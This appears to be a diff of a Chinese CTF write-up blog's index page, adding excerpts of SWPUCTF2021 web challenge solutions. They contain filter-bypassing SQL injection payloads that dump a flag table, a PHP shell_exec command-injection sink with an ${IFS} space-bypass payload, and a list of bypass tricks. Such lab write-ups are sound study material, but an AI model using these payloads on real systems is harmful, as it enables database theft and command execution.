@@ -131,6 +131,73 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/06/SWPUCTF2021-sql-wp/" >SWPUCTF2021-sql-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-06
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/442">题目链接</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 空格和等号都被过滤 </span></span><br><span class="line"><span class="comment"># 空格替换为 /**/</span></span><br><span class="line"><span class="comment"># 等号替换为 like</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看列数、数据库名</span></span><br><span class="line">?wllm=-<span class="number">1</span><span class="string">&#x27;order/**/by/**/3%23</span></span><br><span class="line"><span class="string">?wllm=-1&#x27;</span>union/**/select/**/<span class="number">1</span>,<span class="number">2</span>,database()%<span class="number">23</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看表名发现有LTLT_flag</span></span><br><span class="line">?wllm=-<span class="number">1</span><span class="string">&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/&#x27;</span>test_d<span class="string">b&#x27;%23  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查看LTLT_flag中列名发现有flag</span></span><br><span class="line"><span class="string">?wllm=-1&#x27;</span>union/**/select/**/<span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)/**/<span class="keyword">from</span>/**/information_schema.columns/**/where/**/table_name/**/like/**/<span class="string">&#x27;LTLT_flag&#x27;</span>%<span class="number">23</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看flag 但是发现有长度截取</span></span><br><span class="line">?wllm=-<span class="number">1</span><span class="string">&#x27;union/**/select/**/1,2,group_concat(flag)/**/from/**/test_db.LTLT_flag%23  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># substr substring right reverse都被屏蔽  发现mid可用（相当于substr）  一组组获取flag</span></span><br><span class="line"><span class="string">?wllm=-1&#x27;</span>union/**/select/**/<span class="number">1</span>,<span class="number">2</span>,mid(group_concat(flag),<span class="number">1</span>,<span class="number">20</span>)/**/<span class="keyword">from</span>/**/test_db.LTLT_flag%<span class="number">23</span>  </span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/07/06/SWPUCTF2021-sql-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/07/06/SWPUCTF2021-babyrce-wp/" >SWPUCTF2021-babyrce-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-06
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/425">题目链接</a>   </p>
+<h3 id="页面内容"><a href="#页面内容" class="headerlink" title="页面内容"></a>页面内容</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="number">1</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;../next.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;小饼干最好吃啦！&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> 小饼干最好吃啦！</span><br></pre></td></tr></table></figure>
+
+<h3 id="设置cookie"><a href="#设置cookie" class="headerlink" title="设置cookie"></a>设置cookie</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;admin&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">response = requests.get(<span class="string">&quot;http://node1.anna.nssctf.cn:28246/&quot;</span>, cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 rasalghul.php</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="访问rasalghul-php-有"><a href="#访问rasalghul-php-有" class="headerlink" title="访问rasalghul.php 有"></a>访问rasalghul.php 有</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h3 id="代码执行-空格绕过得到flag"><a href="#代码执行-空格绕过得到flag" class="headerlink" title="代码执行 空格绕过得到flag"></a>代码执行 空格绕过得到flag</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=cat$&#123;IFS&#125;/flllllaaaaaaggggggg;</span><br></pre></td></tr></table></figure>
+
+<h3 id="补充-空格绕过-："><a href="#补充-空格绕过-：" class="headerlink" title="补充 [空格绕过]："></a>补充 [空格绕过]：</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line">$IFS<span class="variable">$9</span></span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;</span><br><span class="line">&lt;</span><br><span class="line">&gt;</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/2023/07/06/SWPUCTF2021-babyrce-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/05/SWPUCTF2021-ezsql-wp/" >SWPUCTF2021-ezsql-wp</a>
 								</h3>
 							</div>
@@ -441,64 +508,6 @@ else show_source(__FILE__);
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/06/13/NISACTF2022-shoppwn-wp/" >NISACTF2022-shoppwn-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-06-13
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp">相关资源</a>  </p>
-<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp/0x1.png?raw=true" alt="img"><br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/NISACTF2022-shoppwn-wp/0x2.png?raw=true" alt="img"><br>sell的时候使用pthread_create，其中有usleep，只要发送速度足够快，可以卖出两次</p>
-<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;3\n0\n3\n0\n2\n1\n1\n&#x27; | nc node3.anna.nssctf.cn 28736</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sell pen</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sell pen</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">buy flag</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">show</span></span><br></pre></td></tr></table></figure>
-	
-	</div>
-  <a type="button" href="/2023/06/13/NISACTF2022-shoppwn-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/06/13/GDOUCTF2023-easymath-wp/" >GDOUCTF2023-小学数学-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-06-13
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/GDOUCTF2023-easymath-wp">相关资源</a></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>查看server.py代码逻辑, 简单替换运算</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">proc = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>, <span class="number">28793</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">&#x27;//&#x27;</span>: <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%&#x27;</span>: <span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;%&#x27;</span>&#125;</span><br><span class="line">sla(<span class="string">b&#x27;start...&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">301</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Round&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    epr = ru(<span class="string">b&#x27;= &#x27;</span>)[:-<span class="number">3</span>].decode().split(<span class="string">&#x27; &#x27;</span>) <span class="comment">#空格分隔</span></span><br><span class="line">    epr[<span class="number">1</span>] = d[epr[<span class="number">1</span>]] <span class="comment"># 替换运算符</span></span><br><span class="line">    epr = <span class="string">&#x27;&#x27;</span>.join(epr)</span><br><span class="line">    <span class="built_in">print</span>(epr)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="built_in">eval</span>(epr)).encode())</span><br></pre></td></tr></table></figure>
-	
-	</div>
-  <a type="button" href="/2023/06/13/GDOUCTF2023-easymath-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -546,7 +555,7 @@ else show_source(__FILE__);
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/CVE/">CVE<span>5</span></a></li>
+			<li><a href="/categories/CVE/">CVE<span>6</span></a></li>
 		
 			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
 		
@@ -558,7 +567,7 @@ else show_source(__FILE__);
 		
 			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
 		
-			<li><a href="/categories/web-learning/">web-learning<span>5</span></a></li>
+			<li><a href="/categories/web-learning/">web-learning<span>6</span></a></li>
 		
 			<li><a href="/categories/web-wp/">web-wp<span>49</span></a></li>
 		
@@ -571,45 +580,45 @@ else show_source(__FILE__);
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/ZJCTF2019/">ZJCTF2019<span>1</span></a></li>
-		
-			<li><a href="/tags/CISCN2019/">CISCN2019<span>1</span></a></li>
-		
-			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
-		
-			<li><a href="/tags/decrypt/">decrypt<span>1</span></a></li>
-		
-			<li><a href="/tags/sql/">sql<span>8</span></a></li>
-		
-			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
-		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
-		
-			<li><a href="/tags/Backdoorctf/">Backdoorctf<span>1</span></a></li>
-		
-			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>13</span></a></li>
+			<li><a href="/tags/天翼杯2021/">天翼杯2021<span>1</span></a></li>
 		
 			<li><a href="/tags/stack-pivot/">stack pivot<span>3</span></a></li>
 		
-			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
+			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
 		
-			<li><a href="/tags/uaf/">uaf<span>2</span></a></li>
+			<li><a href="/tags/二进制插桩/">二进制插桩<span>2</span></a></li>
 		
-			<li><a href="/tags/afr/">afr<span>2</span></a></li>
+			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
 		
-			<li><a href="/tags/got/">got<span>3</span></a></li>
+			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
 		
-			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
+			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
 		
-			<li><a href="/tags/CTFSHOW/">CTFSHOW<span>2</span></a></li>
+			<li><a href="/tags/5字符RCE/">5字符RCE<span>1</span></a></li>
 		
-			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
+			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
 		
-			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
+			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
 		
 			<li><a href="/tags/无参函数构造rce/">无参函数构造rce<span>2</span></a></li>
+		
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
+		
+			<li><a href="/tags/HS2019/">HS2019<span>1</span></a></li>
+		
+			<li><a href="/tags/Backdoorctf/">Backdoorctf<span>1</span></a></li>
+		
+			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
+		
+			<li><a href="/tags/DASCTF2023/">DASCTF2023<span>1</span></a></li>
+		
+			<li><a href="/tags/StarCTF2018/">StarCTF2018<span>1</span></a></li>
+		
+			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/HNCTF2022/">HNCTF2022<span>2</span></a></li>
+		
+			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>113</span></a></li>
@@ -625,6 +634,14 @@ else show_source(__FILE__);
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/12/02/JAVA反序列化CC1/" ><i class="fa fa-file-o"></i>JAVA反序列化CC1</a>
+      </li>
+    
+      <li>
+        <a href="/2023/11/24/xxe/" ><i class="fa fa-file-o"></i>xxe</a>
+      </li>
+    
+      <li>
         <a href="/2023/11/20/CVE-2018-1259复现/" ><i class="fa fa-file-o"></i>CVE-2018-1259复现</a>
       </li>
     
@@ -634,14 +651,6 @@ else show_source(__FILE__);
     
       <li>
         <a href="/2023/11/07/Backdoorctf-funsignals-wp/" ><i class="fa fa-file-o"></i>Backdoorctf-funsignals-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/25/HDCTF2023-YamiYami-wp/" ><i class="fa fa-file-o"></i>HDCTF2023-YamiYami-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/23/GDOUCTF2023-reverseClock-wp/" ><i class="fa fa-file-o"></i>GDOUCTF2023-反方向的钟-wp</a>
       </li>
     
   </ul>
